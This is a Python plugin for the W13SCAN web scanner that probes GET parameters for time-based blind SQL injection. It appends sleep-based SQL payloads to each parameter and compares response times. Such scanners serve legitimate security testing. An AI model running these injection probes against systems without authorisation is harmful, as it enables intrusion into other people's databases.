#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/6/30 4:44 PM
# @Author  : w8ay
# @File    : sql_inject_time.py
import copy
import os
import time

import requests

from lib.common import prepare_url
from lib.const import acceptedExt, ignoreParams
from lib.output import out
from lib.plugins import PluginBase


class W13SCAN(PluginBase):
    name = '基于时间的SQL注入'
    desc = '''目前仅支持GET方式的请求'''

    def audit(self):
        method = self.requests.command  # 请求方式 GET or POST
        headers = self.requests.get_headers()  # 请求头 dict类型
        url = self.build_url()  # 请求完整URL

        resp_data = self.response.get_body_data()  # 返回数据 byte类型
        resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
        resp_headers = self.response.get_headers()  # 返回头 dict类型

        p = self.requests.urlparse
        params = self.requests.params
        netloc = self.requests.netloc

        if method == 'GET':
            if p.query == '':
                return
            exi = os.path.splitext(p.path)[1]
            if exi not in acceptedExt:
                return

            sql_flag = [
                "'and(select+sleep({time})union/**/select+1)='",
                '"and(select+sleep({time})union/**/select+1)="',
                '/**/and(select+sleep({time})union/**/select+1)'
            ]
            for k, v in params.items():
                if k.lower() in ignoreParams:
                    continue
                data = copy.deepcopy(params)
                for flag in sql_flag:
                    # first request
                    payload1 = flag.format(time=0)
                    data[k] = v + payload1
                    url1 = prepare_url(netloc, params=data)
                    _ = time.time()
                    r = requests.get(url1, headers=headers)
                    html1 = r.text
                    elapsed = time.time() - _

                    # second request
                    payload2 = flag.format(time=2)
                    data[k] = v + payload2
                    _ = time.time()
                    r2 = requests.get(netloc, params=data, headers=headers)
                    html2 = r2.text
                    elapsed2 = time.time() - _
                    if elapsed2 - elapsed > 1.5:
                        msg = " {k}:{v1} 耗时 {time1}s; {k}:{v2} 耗时 {time2}s".format(k=k, v1=payload1, v2=payload2,
                                                                                   time1=elapsed, time2=elapsed2)
                        # out.log(msg)
                        out.success(url, self.name, payload=k, condition=msg)
                        break
